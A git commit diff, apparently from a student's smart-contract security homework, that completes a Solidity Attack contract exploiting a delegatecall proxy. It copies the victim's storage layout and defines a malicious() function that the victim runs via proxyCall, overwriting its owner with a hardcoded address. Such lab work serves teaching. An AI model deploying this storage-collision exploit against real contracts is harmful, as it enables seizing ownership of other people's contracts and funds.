edfafebee6b6b018c96031efbdcaa27ca361c42e
ai4bing <asdfghj34440@gmail.com>
2024-03-13 22:52:39 +0800

    delegation; hw1 finished

--- hw1/src/Delegation/Delegation.sol
+++ hw1/src/Delegation/Delegation.sol
@@ -10,16 +10,31 @@ contract Attack {
     address internal immutable victim;
     // TODO: Declare some variable here
     // Note: Checkout the storage layout in victim contract
+    uint256 var0 = 12345;
+    uint8 var1 = 32;
+    string private var2;
+    address private var3;
+    uint8 private var4;
+    address public owner;
+    mapping(address => bool) public result;
 
     constructor(address addr) payable {
         victim = addr;
     }
 
     // NOTE: You might need some malicious function here
+    function none() external {}
+
+    function malicious() external {
+        owner = 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE;
+        result[0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE] = true;
+    }
 
     function exploit() external {
         // TODO: Add your implementation here
         // Note: Make sure you know how delegatecall works
         // bytes memory data = ...
+
+        ID31eg4t3(victim).proxyCall(abi.encodeWithSignature("malicious()"));
     }
 }
